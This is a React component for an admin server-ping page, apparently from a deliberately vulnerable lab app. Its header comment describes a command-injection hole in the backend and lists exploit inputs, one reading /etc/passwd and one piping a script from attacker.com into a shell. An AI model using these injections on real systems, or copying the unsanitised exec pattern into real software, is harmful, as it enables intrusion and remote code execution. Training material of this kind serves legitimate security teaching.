import { useState } from 'react';
import { useAuth } from '../context/AuthContext';
import axios from 'axios';

/**
 * VULN NOTES:
 * - OS Command Injection:  The "host" value is passed directly to
 *   child_process.exec(`ping -c 4 ${host}`).
 *   Exploit examples:
 *     127.0.0.1; cat /etc/passwd
 *     127.0.0.1 && whoami
 *     $(id)
 *     127.0.0.1; curl http://attacker.com/shell.sh | sh
 */
export default function AdminPing() {
  const { token } = useAuth();

  const [host, setHost] = useState('127.0.0.1');
  const [output, setOutput] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handlePing = async (e) => {
    e.preventDefault();
    setLoading(true);
    setOutput('');
    setError('');

    try {
      const { data } = await axios.post('/api/admin/ping',
        { host },
        { headers: { Authorization: `Bearer ${token}` } }
      );

      setOutput(`$ ${data.command}\n\n${data.output}`);
    } catch (err) {
      setError(err.response?.data?.error || 'Ping failed');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <div className="page-header">
        <h1>🏓 Server Ping Tool</h1>
        <p>Ping internal services to check availability</p>
      </div>

      <form onSubmit={handlePing} className="flex gap-1 mb-3 items-center" style={{ flexWrap: 'wrap' }}>
        <div className="form-group" style={{ marginBottom: 0, flex: 1 }}>
          <input
            value={host}
            onChange={(e) => setHost(e.target.value)}
            placeholder="Enter hostname or IP"
          />
        </div>
        <button type="submit" className="btn btn-primary" disabled={loading}>
          {loading ? 'Pinging…' : '🏓 Ping'}
        </button>
      </form>

      {/* Quick-access buttons */}
      <div className="flex gap-1 mb-3" style={{ flexWrap: 'wrap' }}>
        {[
          '127.0.0.1',
          'localhost',
          'backend',
        ].map((p) => (
          <button
            key={p}
            className="btn btn-sm btn-secondary"
            onClick={() => setHost(p)}
          >
            {p}
          </button>
        ))}
      </div>

      {error && <div className="alert alert-error">{error}</div>}
      {output && <div className="terminal-output">{output}</div>}
    </div>
  );
}
